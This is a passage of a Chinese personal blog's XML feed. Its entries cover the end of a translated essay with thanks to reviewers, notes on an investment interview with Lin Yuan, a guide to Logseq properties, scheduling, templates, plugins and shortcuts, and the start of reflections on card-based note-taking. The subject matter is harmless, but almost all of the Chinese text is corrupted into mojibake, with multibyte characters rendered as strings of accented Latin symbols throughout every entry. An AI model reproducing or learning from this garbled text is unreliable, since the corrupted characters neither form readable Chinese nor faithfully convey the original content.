å‡ºç”Ÿåœ¨æç«¯è´«å›°åœ°åŒºï¼Œé‚£ä¹ˆè¿™å°±è¶…çº§å›°éš¾äº†ã€‚</p><p>æœºä¼šåˆ†é…å¦‚æ­¤ä¸å‡ï¼Œæ˜¾ç„¶æ˜¯ä¸€ç§éš¾ä»¥ç½®ä¿¡çš„è€»è¾±å’Œæµªè´¹ã€‚ä½†æ˜¯ï¼Œæˆ‘å·²ç»ç›®ç¹äº†è¶³å¤Ÿå¤šçš„äººå‡ºç”Ÿåœ¨å¯¹ä»–ä»¬éå¸¸ä¸åˆ©çš„ç¯å¢ƒä¸­ï¼Œå¹¶å–å¾—äº†ä»¤äººéš¾ä»¥ç½®ä¿¡çš„æˆåŠŸï¼Œæ‰€ä»¥æˆ‘çŸ¥é“è¿™æ˜¯å¯èƒ½çš„ã€‚</p><p>æˆ‘æ·±æ·±åœ°æ„è¯†åˆ°ï¼Œå¦‚æœæˆ‘ä¸æ˜¯ç”Ÿæ¥å°±éå¸¸å¹¸è¿ï¼Œæˆ‘ä¸ªäººå°±ä¸ä¼šæœ‰ç°åœ¨çš„æˆå°±ã€‚</p><p>æ„Ÿè°¢å¸ƒè±æ©-é˜¿å§†æ–¯ç‰¹æœ—ã€æ ¼é›·æ ¼-å¸ƒç½—å…‹æ›¼ã€é“å°”é¡¿-è€ƒå¾·å¨å°”ã€æˆ´å®‰-å†¯-å¼—æ–¯æ»•ä¼¯æ ¼ã€éº¦è¿ª-éœå°”ã€å¾·é²-ä¼‘æ–¯é¡¿ã€ç»´è¯ºå¾·-ç§‘æ–¯æ‹‰ã€æ°è¥¿å¡-åˆ©æ–‡æ–¯é¡¿ã€ä¹”æ©-åˆ©ç»´ã€å¢å…‹-è¿ˆå°”æ–¯ï¼ˆ6ç¨¿ï¼ï¼‰ã€è¿ˆå…‹å°”-è«é‡ŒèŒ¨ã€é˜¿é‡Œ-ç½—æ ¼å°¼ã€è¿ˆå…‹å°”-å¡è´å°”ã€å½¼å¾—-æ³°å°”ã€ç‰¹è•¾è¥¿-æ¨å’Œå¸Œæ–‡-é½åˆ©æ–¯å¯¹æœ¬ç¨¿çš„å®¡æ ¸ï¼Œç‰¹åˆ«æ„Ÿè°¢æ‹‰å¥‡-æ ¼ç½—å§†å¸®åŠ©æ’°å†™ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Archives</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ—å›­è°ˆæŠ•èµ„</title>
    <link href="/cn/linyuan_interview/"/>
    <url>/cn/linyuan_interview/</url>
    
    <content type="html"><![CDATA[<p>çœ‹äº†ä¸€ä¸ª2012å¹´é‡‡è®¿æ—å›­çš„è§†é¢‘ï¼Œæ¯ä¸ªæˆåŠŸçš„äººå£«å¯¹æŠ•èµ„éƒ½æœ‰è‡ªå·±çš„çœ‹æ³•ã€‚ </p><ul><li>æŠ•èµ„æœ€é‡è¦çš„è¦å°‘çŠ¯é”™</li><li>è™½ç„¶æ²¡æ³•é¢„æµ‹è‚¡ç¥¨èµ°åŠ¿ï¼Œä½†æ˜¯è‚¡ç¥¨ä»·æ ¼çš„é«˜ä½è¿˜æ˜¯éœ€è¦æ¸…æ¥šçš„ï¼Œè™½ç„¶ä»·æ ¼ä½çš„å¯èƒ½ç»§ç»­èµ°ä½ï¼Œä»·æ ¼é«˜çš„å¯èƒ½ç»§ç»­èµ°é«˜</li><li>æŠ•æœºå’ŒæŠ•èµ„æ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼ŒæŠ•æœºçš„ã€Œæœºã€æ˜¯æ‹©æ—¶ï¼Œä»·å€¼æŠ•èµ„ä¹Ÿæ˜¯æ‹©æ—¶ï¼Œå¸‚åœºä¸Šçš„è‚¡ç¥¨ä¾›éœ€å…³ç³»ä¼šå½±å“ä»·æ ¼</li><li>éœ€è¦çŸ¥é“å¸‚åœºå‘¨æœŸï¼Œç‰›ç†Šè½®å›ï¼Œä¸åŒçš„å¸‚åœºæ—¶æœŸï¼Œé€‰æ‹©çš„æŠ•èµ„ç­–ç•¥ä¹Ÿä¸åŒ</li><li>åš3åˆ°5å¹´çš„é•¿çº¿æŠ•èµ„ï¼Œå…³æ³¨å¸‚åœºçš„ä¸»çº¿ï¼Œåœ¨é¾™å¤´è‚¡ä¸Šèµšå¤§é’±</li><li>æ³¨é‡é£é™©ç®¡ç†ï¼ŒæŠ•èµ„å‰æµ‹ç®—æœ€å·®æƒ…å†µï¼Œåªåœ¨æœ‰æŠŠæ¡æ—¶ä¸‹æ³¨ï¼Œå¹³æ—¶ä¸å¤ªçœ‹ç›˜</li><li>ä½¿ç”¨èµ„äº§é…ç½®æ¥åˆ†æ‘Šé£é™©ï¼Œæˆ¿åœ°äº§ã€å€ºåˆ¸ã€è‚¡ç¥¨ç­‰å‡æœ‰æ¶‰çŒ</li><li>æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±æ“…é•¿çš„æ ‡çš„(èƒ½åŠ›åœˆ)ï¼Œæ—å›­çš„æŠ•èµ„ä¸»çº¿æ˜¯å’Œåƒçš„æœ‰å…³ç³»çš„æ¶ˆè´¹è‚¡</li></ul><p>è¿™ç¯‡é‡‡è®¿å‡ºäº†ä¸ªå½©è›‹ğŸ‰ï¼Œä¸»æŒäººé—®æ—å›­å¹³æ—¥éƒ½æœ‰å•¥çˆ±å¥½ã€‚æ—å›­è¯´ä»–æœ‰ä¸¤ä¸ªçˆ±å¥½ï¼š1. é€›å¤œæ€»ä¼š 2. èµ°é•¿è·¯<br>æ—å›­é€›å¤œæ€»ä¼šçš„æ®µå­å·²ç»å¹¿æ³›æµä¼ ï¼Œä¸»æŒäººä¹Ÿæ¥ä¸ä½è¿™è¯èŒ¬ ï¼šï¼‰è®¤çœŸåˆ†æ é€›å¤œæ€»ä¼šæ˜¯çœ‹é«˜ç«¯æ¶ˆè´¹ï¼Œèµ°é•¿è·¯æ˜¯çœ‹æ—¥å¸¸æ¶ˆè´¹ã€‚<br>ä¸€èˆ¬æˆåŠŸçš„æŠ•èµ„äººéƒ½æœ‰è‡ªå·±ç‹¬ç‰¹çš„æŒ‡æ ‡ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Logseq ä½¿ç”¨å°ç»“ ï¼ˆä¸‰ï¼‰</title>
    <link href="/cn/logseq3/"/>
    <url>/cn/logseq3/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ Logseq å†™ç¬”è®°å·²ç»å¤§åŠå¹´äº†ï¼ŒLogseq æ˜¯è¿™ä¹ˆå¤šå¹´æ¥é™¤äº† vim ä¹‹å¤–ï¼Œå”¯ä¸€å¯ä»¥åœ¨ä½¿ç”¨ä¸Šèºæ—‹ä¸Šå‡çš„è½¯ä»¶ã€‚æˆ‘æŠŠ Logseq æ¨èç»™åª³å¦‡ï¼Œå¥¹ç”¨æ¥å†™ä¼šè®®çºªè¦ï¼Œå†™å¤‡å¿˜å½•ï¼Œç®¡ç†å¾…åŠäº‹é¡¹ï¼Œä¹Ÿç”¨å¾—æŒºå¥½ã€‚</p><p>Logseq çš„æˆåŠŸä¹‹å¤„åœ¨äºå®ƒé™ä½äº†è®°å½•çš„æˆæœ¬ï¼Œä¸éœ€è¦å¤§æ®µå¤§æ®µçš„æ–‡å­—ï¼Œä¹Ÿä¸éœ€è¦å¤ªå¤šçš„æ–‡ç« ç»“æ„ï¼Œéšæ—¶éƒ½å¯ä»¥è®°å½•ã€‚Logseq æ¯”è¾ƒä¸¥é‡çš„é—®é¢˜æ˜¯å®ƒçš„ä½¿ç”¨å¤ªçµæ´»äº†ï¼Œå‰åè®°å½•çš„æ ‡å‡†ã€æ ¼å¼ã€æ ‡ç­¾ç­‰è¦ç´ å¯èƒ½ä¸ä¸€è‡´ï¼Œå®¹æ˜“é€ æˆç¬”è®°å‡Œä¹±ã€‚ç¬”è®°ä¸€å‡Œä¹±å°±æ²¡æ³•æœ‰æ•ˆçš„èšåˆï¼Œç¬”è®°çš„æœ‰æ•ˆèšåˆå½¢æˆä¸€ä¸ªæœ‰æ„ä¹‰çš„æƒ³æ³•ç¾¤æ˜¯ Logseq ç­‰åŒé“¾è½¯ä»¶å’Œå…¶ä»–ç¬”è®°è½¯ä»¶ç›¸æ¯”æœ€æœ‰ä»·å€¼çš„åœ°æ–¹ã€‚</p><p>æˆ‘è¿™åŠå¹´æ¥æ€»ç»“å‡ºç¬”è®°ç³»ç»ŸæˆåŠŸçš„å…³é”®æ˜¯ï¼š åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œç”¨åŒæ ·çš„æ ¼å¼å’Œä¸€è‡´çš„æ ‡å‡†è®°å½•ä½ çš„æ´è§ã€‚ä½†æ˜¯ç”±äº Logseq ç¼ºä¹æœ‰æ•ˆçš„å·¥ä½œæµï¼Œæ²¡æ³•è‡ªåŠ¨åŒ–æç¤ºå¿…è¦çš„æ­¥éª¤ï¼Œåªèƒ½é€šè¿‡ä¸æ–­çš„ç»ƒä¹ æ¥å¼ºåŒ–å­¦ä¹ ã€‚å¦å¤– Logseq ä¸­ page å’Œ tag åªæ˜¯èµ·åˆ°è¿‡æ»¤ç¬”è®°çš„ä½œç”¨ï¼Œæœ€å…³é”®çš„ç¬”è®°ä¹‹é—´çš„é“¾æ¥å´å¾ˆå®¹æ˜“è¢«å¿½è§†ï¼Œtag çš„æ•°é‡ä¸€å¤šåˆä¼šå¼€å§‹ç¬”è®°å‡Œä¹±äº†ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œå¦‚æœåªæ˜¯æŠŠ Logseq ä½œä¸ºå¤‡å¿˜ï¼Œæˆ–è€…ç®€å•ä½œä¸ºä¿¡æ¯è®°å½•ï¼ŒæŒºå¥½ç”¨ä¹Ÿä¸éœ€è¦å­¦ä¹ å¤ªå¤šçš„ä¸œè¥¿ï¼Œä½†æ˜¯å¦‚æœéœ€è¦ä½¿ç”¨ Logseq æ¥å®è·µå¡ç‰‡ç¬”è®°æ³•ç­‰ PKM ç†è®ºï¼Œææ€•è¿˜æ˜¯éœ€è¦èŠ±è´¹ä¸€äº›åŠŸå¤«ä»”ç»†ç¢ç£¨ä¸€ç•ªã€‚PKM æ–¹é¢çš„ä¹¦ç±æˆ‘å¼ºåŠ›æ¨è ã€Šå¡ç‰‡ç¬”è®°å†™ä½œæ³•ã€‹ä¸€ä¹¦ï¼Œä¸­æ–‡ç¿»è¯‘å¾ˆä¸é”™ï¼Œè™½ç„¶ä¹¦åæ˜¯è°ˆå†™ä½œï¼Œé‡Œé¢çš„å†…å®¹å´æ¶‰åŠå¾ˆå¹¿ï¼Œæˆ‘è‡ªå·±é˜…è¯»åæ”¶ç›Šè‰¯å¤šã€‚</p><p>å°±å®è·µå¡ç‰‡ç¬”è®°æ³•æ¥è¯´ï¼Œæµ®å¢¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒç†æƒ³çš„å·¥å…·ï¼Œã€Œå°‘å³æ˜¯å¤šï¼Œå¤šåˆ™æƒ‘ã€ï¼Œå»æ‰ä¸€åˆ‡ä¸éœ€è¦çš„åŠŸèƒ½ï¼Œé‡ç‚¹æ‰èƒ½çªå‡ºã€‚Logseq çš„é‡å¿ƒæŒºå¤§ï¼Œä¸æƒ³åªåšä¸€ä¸ªåŒé“¾ç¬”è®°æœ¬ï¼Œè¿˜æƒ³åšå¾—æ›´å¤šï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬æƒ³æ¸…æ¥šä½¿ç”¨å…¶çš„ä¸»è¦ç›®çš„æ˜¯ä»€ä¹ˆã€‚ç°å®ä¸­å¹¶ä¸å­˜åœ¨ä¸€ä¸ª all in one çš„ç†æƒ³å·¥å…·ï¼Œä»€ä¹ˆå·¥å…·åˆé€‚å°±å¯ä»¥ä½¿ç”¨ä»€ä¹ˆå·¥å…·ï¼Œå„ä½æ–½ä¸»ä¸èƒ½ ã€Œç€ç›¸ã€äº†ã€‚</p><p>ä¸Šé¢è¯´çš„æ˜¯ä¸€äº›ã€Œé“ã€å±‚é¢çš„ä¸œè¥¿ï¼Œ Logseq åœ¨ã€Œæœ¯ã€æ–¹é¢çš„ä¸œè¥¿ä¹Ÿä¸å°‘ï¼Œä¸‹é¢å°†ä»‹ç»ä¸€äº›å‰ä¸¤ç¯‡å°šæœªæ¶‰åŠçš„åŠŸèƒ½å’Œä½¿ç”¨æŠ€å·§ã€‚</p><h2 id="â˜†-ä½¿ç”¨-properties"><a href="#â˜†-ä½¿ç”¨-properties" class="headerlink" title="â˜† ä½¿ç”¨ properties"></a>â˜† ä½¿ç”¨ properties</h2><p><a href="https://docs.logseq.com/#/page/term%2Fproperties">https://docs.logseq.com/#/page/term%2Fproperties</a></p><p>åœ¨ Logseq ä¸­æœ‰ä¸¤ç§ propertiesï¼Œ page properties å’Œ block propertiesã€‚</p><ul><li>Page properties åœ¨ç¬¬ä¸€ä¸ª block å†™ <code>property:: value</code>  </li><li>Block properties åœ¨æ¯ä¸ª block å†…ä½¿ç”¨ <code>property:: value</code></li></ul><p>åœ¨ä½¿ç”¨ block properties æ—¶ï¼Œéœ€è¦è¾“å…¥ <code>shift + Enter</code> æ¥è¿›è¡Œæ¢è¡Œï¼Œæ¢è¡Œåè¾“å…¥ <code>::</code> Logseq ä¼šè‡ªåŠ¨æç¤ºå·²ç»ä½¿ç”¨è¿‡çš„ propertyã€‚ç†è§£ properties å¯ä»¥ç®€å•çš„æŠŠ block çœ‹æˆæ•°æ®åº“çš„ä¸€æ¡è®°å½•ï¼Œ properties å°±æ˜¯ä¸åŒçš„å­—æ®µï¼Œå¯ä»¥é€šè¿‡ Logseq çš„ query æ¥æŸ¥è¯¢ç›¸å…³è®°å½•ã€‚åœ¨ä½¿ç”¨ properties æ—¶å¯ä»¥å¼•ç”¨ page æˆ–è€… tagï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•æ¥ç´¢å¼•è¿™æ¡è®°å½•ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘å°†ä¹¦ç±çš„ block éƒ½æ·»åŠ äº† <code>category:: Books</code> çš„å±æ€§ï¼Œåç»­å¯ä»¥ä½¿ç”¨ <code>&#123;&#123;query (property category Books) &#125;&#125;</code> æ¥æŸ¥è¯¢æ‰€æœ‰ä¹¦ç±äº†ï¼Œæ„Ÿè§‰ä¸Šæœ‰ç‚¹ç±»ä¼¼ notion çš„è¡¨æ ¼ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_1.png"></p><h2 id="â˜†-ä½¿ç”¨-Scheduled-åˆ¶å®šè®¡åˆ’"><a href="#â˜†-ä½¿ç”¨-Scheduled-åˆ¶å®šè®¡åˆ’" class="headerlink" title="â˜† ä½¿ç”¨ &#x2F;Scheduled åˆ¶å®šè®¡åˆ’"></a>â˜† ä½¿ç”¨ &#x2F;Scheduled åˆ¶å®šè®¡åˆ’</h2><p>ä½¿ç”¨ Schedule çš„åŠŸèƒ½çš„æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œåœ¨å†™å®Œä¸€æ¡ block åï¼Œè¾“å…¥ <code>shift + enter </code> æ¢è¡Œåï¼Œè¾“å…¥ <code>/Scheduled</code> åœ¨å¼¹å‡ºçš„ç•Œé¢ä¸­é€‰æ‹©æ—¶é—´å‘¨æœŸå³å¯ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_2.png"></p><p>åœ¨ Schedule è§„å®šçš„æ—¶é—´å†…ï¼ŒLogseq çš„ Journals é¡µé¢å¯ä»¥çœ‹åˆ°ç›¸å…³çš„å†…å®¹ã€‚</p><h2 id="â˜†-ä½¿ç”¨æ¨¡æ¿-ï¼ˆTemplateï¼‰"><a href="#â˜†-ä½¿ç”¨æ¨¡æ¿-ï¼ˆTemplateï¼‰" class="headerlink" title="â˜† ä½¿ç”¨æ¨¡æ¿ ï¼ˆTemplateï¼‰"></a>â˜† ä½¿ç”¨æ¨¡æ¿ ï¼ˆTemplateï¼‰</h2><p><a href="https://docs.logseq.com/#/page/templates">https://docs.logseq.com/#/page/templates</a></p><p>ä½¿ç”¨æ¨¡æ¿çš„å¥½å¤„æ˜¯å¯ä»¥é¿å…é‡å¤æ€§çš„åŠ³åŠ¨ï¼Œæ¯”å¦‚ä½ å¸Œæœ›åœ¨ Journals é¡µé¢é‡ŒæŒ‰ç…§ [[æ¯æ—¥å·¥ä½œ]] [[æ¯æ—¥å¿ƒå¾—]] çš„å›ºå®šæ ¼å¼æ¥è®°å½•ï¼Œé‚£ä¹ˆä½ éœ€è¦åœ¨æ¯å¤©é‡å¤è¾“å…¥ä¸€æ¬¡ã€‚ä½†å¦‚æœä½ åˆ¶ä½œä¸€ä¸ªå›ºå®šæ¨¡æ¿ï¼Œå°±å¯ä»¥ä½¿ç”¨ <code>/Template</code> å‘½ä»¤æ¥å®Œæˆè‡ªåŠ¨åŒ–çš„è¾“å…¥ã€‚</p><p>åˆ¶ä½œæ¨¡æ¿çš„è¿‡ç¨‹å¯ä»¥å‚è€ƒ Logseq å®˜æ–¹çš„åŠ¨ç”»ï¼Œç®€å•è¯´å°±æ˜¯å†™ä¸€ä¸ª blockï¼Œè¿™ä¸ª block åŒ…å«äº†å¿…è¦çš„ç»“æ„ï¼Œåœ¨ block å‰é¢çš„åœ†ç‚¹ç‚¹å‡»é¼ æ ‡å³é”® -&gt; Make templateï¼Œå†è¾“å…¥æ¨¡æ¿çš„åå­—å°±å®Œæˆäº†ã€‚åœ¨åç»­çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥ <code>/Template</code> ååœ¨å¼¹å‡ºçš„ç•Œé¢é€‰æ‹©å¯¹åº”çš„æ¨¡æ¿åå°±å¯ä»¥å®Œæˆè‡ªåŠ¨åŒ–çš„è¾“å…¥ã€‚</p><h2 id="â˜†-ä¸€äº›å¥½ç”¨çš„æ’ä»¶"><a href="#â˜†-ä¸€äº›å¥½ç”¨çš„æ’ä»¶" class="headerlink" title="â˜† ä¸€äº›å¥½ç”¨çš„æ’ä»¶"></a>â˜† ä¸€äº›å¥½ç”¨çš„æ’ä»¶</h2><p>æ’ä»¶å¯ä»¥æ‹“å±• Logseq çš„åŠŸèƒ½ï¼Œä½¿ç”¨æ’ä»¶çš„æ–¹æ³•åœ¨ <a href="https://www.usmacd.com/2022/03/07/logseq2/">Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰</a> ä¸­æœ‰è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸å†ç»†è¯´ã€‚</p><h3 id="Logseq-Plugin-Tabs"><a href="#Logseq-Plugin-Tabs" class="headerlink" title="Logseq Plugin Tabs"></a>Logseq Plugin Tabs</h3><p><a href="https://github.com/pengx17/logseq-plugin-tabs">https://github.com/pengx17/logseq-plugin-tabs</a></p><p>Plugin Tabs åƒæ‰“å¼€æµè§ˆå™¨ä¸€æ ·æ‰“å¼€ pages æˆ–è€… blocksï¼Œå¯¹äºå†…å®¹æ¯”è¾ƒå¤šçš„ pageï¼Œè¿™ä¸ªæ’ä»¶éå¸¸å®ç”¨ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_4.png"></p><h3 id="logseq-plugin-mark-map"><a href="#logseq-plugin-mark-map" class="headerlink" title="logseq-plugin-mark-map"></a>logseq-plugin-mark-map</h3><p><a href="https://github.com/vipzhicheng/logseq-plugin-mark-map">https://github.com/vipzhicheng/logseq-plugin-mark-map</a></p><p>Mark map å¯ä»¥è‡ªåŠ¨åŒ–åœ°æŠŠä½ çš„ç¬”è®°ç”¨å¯¼å›¾çš„å½¢å¼è¾“å‡ºï¼Œæ–¹ä¾¿å±•ç¤ºå’Œè®°å¿†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_5.png"></p><h2 id="â˜†-ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§"><a href="#â˜†-ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§" class="headerlink" title="â˜† ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§"></a>â˜† ä¸€äº›ä½¿ç”¨ä¸Šçš„å°æŠ€å·§</h2><ul><li>Logseq content wide mode  å¯ä»¥ä½¿ç”¨å¿«æ·é”®åˆ‡æ¢ <code>t w</code>  </li><li>Logseq çš„ property å¯ä»¥é€šè¿‡è¾“å…¥ <code>::</code> æ¥è§¦å‘è‡ªåŠ¨è¡¥å…¨æ“ä½œï¼Œéå¸¸æ–¹ä¾¿ã€‚  </li><li>Logseq ä½¿ç”¨å¿«æ·é”® <code>Cmd + Shift + i</code> å¯ä»¥æ‰“å¼€ devtools  </li><li>Logseq v0.68ï¼Œè‡ªåŠ¨è¡¥å…¨æä¾›ä¸¤ä¸ªå¿«æ·é”® <code>mod+p</code> å’Œ <code>mod+n</code> æ¯”è¾ƒæ–¹ä¾¿äº†  </li><li>Logseq å¯ä»¥ä½¿ç”¨ <code>command + </code> å’Œ <code>command -</code> æ¥æ”¾å¤§æˆ–è€…ç¼©å° Logseq çš„å­—ä½“å¤§å°  </li><li>Logseq 0.7.1 æ–°åŠŸèƒ½ï¼šCopy &amp; Paste with rich-text formatsï¼Œå¦‚æœç²˜è´´æ—¶ä¸æƒ³ä¿ç•™æ ¼å¼ <code>mod + shift + v</code>  </li><li>Logseq ç§»åŠ¨å…‰æ ‡çš„å¿«æ·é”®ï¼š<code>mod + p</code> å‘ä¸Šç§»åŠ¨å…‰æ ‡ï¼Œ<code>mod + n</code> å‘ä¸‹ç§»åŠ¨å…‰æ ‡  </li><li>Logseq Markdown è¯­æ³•æ”¯æŒ <code> Horizontal Rules</code>ï¼Œå¯ä»¥ä½¿ç”¨ <code>---</code>åˆ†éš”å¡ç‰‡ç¬”è®°ã€‚</li></ul><p>mod åœ¨ windows å’Œ linux ç³»ç»Ÿä¸­æ˜¯ <code>ctrl</code>ï¼Œ åœ¨ macOS ç³»ç»Ÿä¸­æ˜¯ <code>command</code></p><h2 id="â˜†-å‚è€ƒé“¾æ¥"><a href="#â˜†-å‚è€ƒé“¾æ¥" class="headerlink" title="â˜†  å‚è€ƒé“¾æ¥"></a>â˜†  å‚è€ƒé“¾æ¥</h2><p><a href="https://www.usmacd.com/cn/logseq/">https://www.usmacd.com/cn/logseq/</a><br><a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a><br><a href="https://www.usmacd.com/cn/logseq_plugins/">https://www.usmacd.com/cn/logseq_plugins/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºç¬”è®°çš„ä¸€äº›æ€è€ƒ</title>
    <link href="/cn/note/"/>
    <url>/cn/note/</url>
    
    <content type="html"><![CDATA[<ul><li><p>Random Notes (æ¼«æ¸¸ç¬”è®°) çš„æŠ€æœ¯åŸç†æ˜¯ç”¨æ–°è§†è§’å»å®¡è§†æ—§æƒ³æ³•ï¼Œå’Œè‡ªå·±ä»¥å‰çš„æƒ³æ³•ä¸æœŸè€Œé‡çš„æ„Ÿè§‰éå¸¸å¥‡å¦™ã€‚æ€»ä½“æ¥è¯´äººæ˜¯ä¼šä¸æ–­è¿›æ­¥çš„ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´åå†å»é‡æ¸©è‡ªå·±æŸä¸ªæ—¶åˆ»çš„æƒ³æ³•ï¼Œå¯èƒ½ä»¥å‰çš„ä¸€äº›ç–‘æƒ‘ç°åœ¨å·²ç»æ²¡æœ‰äº†ï¼Œä¹Ÿå¯èƒ½å¯¹æŸä¸ªé—®é¢˜æœ‰äº†æ›´è¿›ä¸€æ­¥çš„æ€è·¯ï¼Œè¿™æ˜¯ä¿ƒä½¿æƒ³æ³•è¿­ä»£çš„ä¸€ç§æ–¹æ³•ã€‚</p></li><li><p>æƒ³è¦åšåˆ°æƒ³æ³•çš„è‡ªç„¶è¿­ä»£ï¼Œå¿…è¦çš„æ¡ä»¶æ˜¯å¯ä»¥é©¬ä¸Šå›åˆ°è¿‡å»çš„æŸä¸ªæ—¶åˆ»ï¼Œè€Œä¸”é‚£ä¸ªæ—¶åˆ»çš„ä¸Šä¸‹æ–‡æ²¡æœ‰ä¸¢å¤±ï¼Œå¦‚æœä¸Šä¸‹æ–‡ä¸¢å¤±æ„å‘³ç€å·²ç»çœ‹ä¸æ‡‚ä»¥å‰çš„ç¬”è®°äº†ï¼Œè‡ªç„¶ä¹Ÿå°±æ²¡æœ‰äº†è¿­ä»£çš„å¯èƒ½æ€§ã€‚</p></li><li><p>å¡ç‰‡ç›’ç¬”è®°æ³•è¦æ±‚ç”¨å®Œæ•´çš„å¥å­ç²¾è¦ç®€è¿°æƒ³æ³•ï¼Œç¬”è®°ä¹‹é—´çš„è¿æ¥åˆ™è¡¥å……äº†ä¸Šä¸‹æ–‡ï¼Œä¸ºæƒ³æ³•è¿­ä»£åˆ›é€ äº†æœ‰åˆ©æ¡ä»¶ã€‚</p></li><li><p>å†™æ°¸ä¹…ç¬”è®°æ—¶ï¼Œåº”è¯¥å‡è®¾è¯»è€…å¯¹æ–‡æœ¬èƒŒåçš„æ€æƒ³ï¼ŒåŸæ–‡èƒŒæ™¯ä¸€æ— æ‰€çŸ¥ï¼Œåªå…·å¤‡ç›¸å…³çš„é¢†åŸŸçŸ¥è¯†ã€‚è¿™é‡Œçš„è¯»è€…å…¶å®ä¹ŸåŒ…æ‹¬æœªæ¥çš„è‡ªå·±ï¼Œæˆ‘ä»¬å†™ä¸‹æ°¸ä¹…ç¬”è®°åï¼Œå¾ˆå¿«å°±ä¼šå°†å…¶çš„ä¸Šä¸‹æ–‡é—å¿˜ï¼Œå°±æƒ³ä»æ²¡æœ‰è§è¿‡è¯¥ç¬”è®°çš„å…¶ä»–è¯»è€…ä¸€æ ·ã€‚</p></li><li><p>æˆ‘ä»¬åº”è¯¥å¯»æ‰¾ä¸æˆ‘ä»¬è§‚ç‚¹ç›¸åçš„è®ºç‚¹æˆ–è€…äº‹å®æ¥æŒ‘æˆ˜æˆ‘ä»¬çš„æ—¢æœ‰æ€ç»´ï¼Œä½†æ˜¯å—ã€Œç¡®è®¤åå·®ã€çš„å½±å“ï¼Œæˆ‘ä»¬ä¼šä¸ç»æ„çš„å¿½ç•¥è¿™äº›ä¿¡æ¯ï¼Œé‚£äº›å’Œæˆ‘ä»¬è§‚ç‚¹ä¸€è‡´çš„ä¿¡æ¯æœ‰å¾ˆå¤§å¸å¼•åŠ›ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯å¯ä»¥è¯æ˜è‡ªå·±å¾ˆåšå­¦ã€‚è§£å†³ ã€Œç¡®è®¤åå·®ã€çš„æ–¹æ³•ï¼šæŠŠå¯»æ‰¾è¯å®æ€§ä¿¡æ¯å˜ä¸ºæ”¶é›†æ‰€æœ‰ä¿¡æ¯ï¼Œä¸éœ€è¦å…³æ³¨è¿™äº›ä¿¡æ¯æ”¯æŒçš„å…·ä½“è§‚ç‚¹ã€‚</p></li><li><p>æˆ‘ä»¬ä½¿ç”¨å¡ç‰‡ç›’ç¬”è®°æ³•ï¼Œå¯¹ä¹ æƒ¯æœ€é‡è¦çš„è½¬å˜æ˜¯å°†æ³¨æ„åŠ›ä»ä¸ªåˆ«é¡¹ç›®çš„é¢„è®¾ç«‹åœºå˜æˆæ€è€ƒç¬”è®°ä¹‹é—´çš„å¼€æ”¾æ€§è”ç³»ã€‚é€šè¿‡ä¸€æ®µæ—¶é—´çš„è®­ç»ƒï¼Œåœ¨é˜…è¯»è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è½»æ¾æ‰¾å‡ºä¸é¢„è®¾è§‚ç‚¹ç›¸æ‚–çš„ä¿¡æ¯ã€‚å½“è¿™äº›ä¿¡æ¯æ”¹å˜æˆ‘ä»¬å¯¹æŸäº›é—®é¢˜çš„çœ‹æ³•æ—¶ï¼Œæˆ‘ä»¬ä¼šæ„Ÿåˆ°ç›¸å½“å…´å¥‹ï¼Œä»è€Œæ…¢æ…¢å–œæ¬¢ä¸Šè¿™ç§æ„Ÿè§‰ã€‚</p></li><li><p>åœ¨å®è·µå¡ç‰‡ç¬”è®°æ³•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šé‡ä¸Šä¸€æ•´å¤©éƒ½æ²¡å†™ä¸€å¼ å¡ç‰‡çš„æ—¶å€™ï¼Œè€Œæœ‰çš„æ—¶å€™åˆ™ä¸€å¤©å†™åå¤šå¼ å¡ç‰‡ã€‚é™åˆ¶æ¯å¤©å†™ç¬”è®°çš„æ•°é‡å¯ä»¥è®©å†™å¡ç‰‡ç›’ç¬”è®°çš„è¿‡ç¨‹æ›´åŠ è½»æ¾ï¼Œé¿å…äº†è¿‡äºæ”¾æ¾çš„çŠ¶æ€ï¼Œä¹Ÿé¿å…äº†è¿‡äºç´§ç»·çš„çŠ¶æ€ï¼Œæœ‰åˆ©äºæˆ‘ä»¬ä¿æŒè‰¯å¥½çš„çŠ¶æ€, ä¹Ÿæœ‰åˆ©äºæé«˜ç¬”è®°çš„è´¨é‡ï¼Œè®©ä½ é€‰æ‹©ç¬”è®°å†…å®¹æ—¶æ›´åŠ æŒ‘å‰”ã€‚</p></li><li><p>ä½ å¯ä»¥å°†ç›®æ 